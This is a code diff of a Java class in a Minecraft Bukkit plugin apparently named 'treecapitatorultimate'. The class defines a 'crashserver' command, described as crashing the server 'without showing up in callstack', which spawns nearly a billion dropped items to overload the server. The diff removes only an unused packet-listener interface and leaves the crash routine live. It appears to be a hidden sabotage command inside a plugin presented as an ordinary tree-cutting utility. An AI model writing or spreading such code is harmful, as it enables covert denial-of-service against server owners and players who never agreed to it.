@@ -2,7 +2,6 @@ package me.bow.treecapitatorultimate.commands.Server;
 
 import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
-import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
 import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
@@ -17,7 +16,7 @@ import org.bukkit.inventory.ItemStack;
 import java.util.ArrayList;
 
 @Command.Info(command = "crashserver", description = "Tries to crash the server without showing up in callstack.", category = CommandCategory.Server)
-public class CrashServer extends Command implements PacketListener {
+public class CrashServer extends Command {
     @Override
     public void onCommand(Player p, ArrayList<String> args) {
         for (Player player : Bukkit.getOnlinePlayers()) {
@@ -29,10 +28,6 @@ public class CrashServer extends Command implements PacketListener {
         for (int i = 0; i < 999999999; i++) {
             Item item = p.getWorld().dropItemNaturally(p.getLocation().subtract(0, 200, 0), stack);
         }
-    }
-
-    @Override
-    public void onPacketReceived(PacketEvent packetEvent) {
     }
 
     @Override
